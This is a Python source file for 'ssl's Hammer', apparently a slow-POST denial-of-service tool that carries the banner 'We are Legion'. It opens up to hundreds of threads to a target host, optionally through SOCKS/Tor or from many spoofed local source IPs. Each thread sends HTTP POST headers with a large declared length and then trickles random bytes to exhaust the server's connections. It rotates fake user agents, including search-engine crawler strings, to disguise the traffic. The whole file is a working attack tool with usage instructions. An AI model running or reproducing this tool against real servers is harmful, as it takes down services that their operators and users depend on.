#!/usr/bin/python

# this assumes you have the socks.py (http://phiral.net/socks.py) 
# and terminal.py (http://phiral.net/terminal.py) in the
# same directory 
# build tcp Connections to ssl server, then send garbages


import os
import subprocess
import re
import time
import sys
import random
import math
import getopt
import socket
import socks
import string
import struct 
import terminal

from threading import Thread

global stop_now
global term

stop_now = False
term = terminal.TerminalController()

useragents = [
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
]

class httpPost(Thread):
    def __init__(self, host, port, srcip):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.srcip = srcip
        self.running = True
		
    def _send_http_post(self, pause=10):
        global stop_now

        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                        (self.host, random.choice(useragents)))

        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
	
        self.socks.close()
		
    def run(self):
        while self.running:
            while self.running:
                try:
                    if srcip != 0:
                        self.socks.bind(srcip)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                    time.sleep(1)
                    continue
	
            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass
 
def dotted_quad_to_num(ip):
    return struct.unpack('L',socket.inet_aton(ip))[0]
def validate_saddr(saddr):
    ValidIpAddressRegex = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
    [addr_s,masklen_s]=saddr.split('/',1)
    #print "addr:%s mask_len:%s"%(addr_s,masklen_s)
    masklen=int(masklen_s)
    if addr_s == '' and masklen_s == '':
        saddr_usage()
        sys.exit(-1)
    result = re.match(ValidIpAddressRegex,addr_s)
    if result is None:
        saddr_usage()
        sys.exit(-1)
    if masklen < 1 or masklen > 32:
        saddr_usage()
        sys.exit(-1)
    mask=((~0)<<(32-masklen))&0xffffffff
    try:
        addr=dotted_quad_to_num(addr_s)
        addr=socket.ntohl(addr)
    except socket.error as msg:
        saddr_usage()
        sys.exit(-1)
    if (addr & mask) != addr:
        saddr_usage()
        sys.exit(-1)
    return addr,mask,masklen
def add_local_ip(interface,startip,mask,masklen):
    endip=startip | (~mask & 0xffffffff)
    #print "startip:%x,endip:%x"%(startip, endip)
    while startip <= endip:
        ip_s=socket.inet_ntoa(struct.pack('L',socket.htonl(startip)));
        #print "%s"%(ip_s)
        #command="ip addr add %s/%d dev %s"%(ip_s,masklen,interface)
        startip+=1
        command=''
        try:
            retcode=subprocess.call(command,shell=True);
            if retcode < 0:
                print >>sys.stderr,"child was terminated by signal",-retcode
            #else:
            #    print >>sys.stderr,"child returned",retcode
        except OSError as e:
            print >>sys.stderr,"Execution failed:",e
def usage():
    print "./sslhammer.py -t <target> [[-r <threads>] | [-s <ip/mask> -i <interface>] -p <port> -h]"
    print " -t|--target <Hostname|IP>"
    print " -r|--threads <Number of threads> Defaults to 256"
    print " -p|--port <Web Server Port> Defaults to 80"
    print " -i|--interface <interface> "
    print " -s|--saddr <ip/mask> default to local ip, this option must used with -i|--interface"
    print " -h|--help Shows this help" 
    print " -r means single ip with multiple ports; -s means multiple ips,but every ip with one port\n"
    print "Eg. ./sslhammer.py -t 192.168.1.100 -r 256\n"
def saddr_usage():
    print "Error saddr format e.g. 192.168.1.1/32, 192.168.1.0/24"

def main(argv):
    
    try:
        opts, args = getopt.getopt(argv, "hTt:r:p:s:i:", ["help", "interface=", "target=", "threads=", "port=","saddr="])
    except getopt.GetoptError:
        usage() 
        sys.exit(-1)

    global stop_now
	
    target = ''
    threads = 0
    port = 80
    eth = ''
    saddr=''
    attack_mode=0

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit(0)
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-r", "--threads"):
            threads = int(a)
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-s","--saddr"):
            saddr=a
            #print "saddr:%s"%(saddr)
        elif o in ("-i","--interface"):
            eth=a
            

    """
    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)
    """
    if saddr =='' and threads==0:
        threads=256
    if saddr !='' and threads !=0:
        usage()
        sys.exit(-1)
    if saddr != '' and eth !='' :
        [addr,mask,masklen]=validate_saddr(saddr)
        add_local_ip(eth,addr,mask,masklen)
        attack_mode=1

        
    if target == '' :
        usage()
        sys.exit(-1)

    print term.DOWN + term.RED + "/*" + term.NORMAL
    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
    print term.RED + " * Threads: %d " % (threads) + term.NORMAL
    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL
    print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL

    rthreads = []
    if attack_mode == 0:
        for i in range(threads):
            t = httpPost(target, port, 0)
            rthreads.append(t)
            t.start()
    elif attack_mode == 1:
        endip= addr| (~mask & 0xffffffff)
        while addr <= endip:
            ip_s=socket.inet_ntoa(struct.pack('L',socket.htonl(addr)));
            addr+=1
            t = httpPost(target, port, ip_s)
            rthreads.append(t)
            t.start()
    
    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print "\nShutting down threads...\n"
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == "__main__":
    print "\n/*"
    print " *"+term.RED + " ssl's Hammer "+term.NORMAL
    print " * Slow ssl DoS Testing Tool"
    print " * We are Legion."
    print " */\n"

    main(sys.argv[1:])

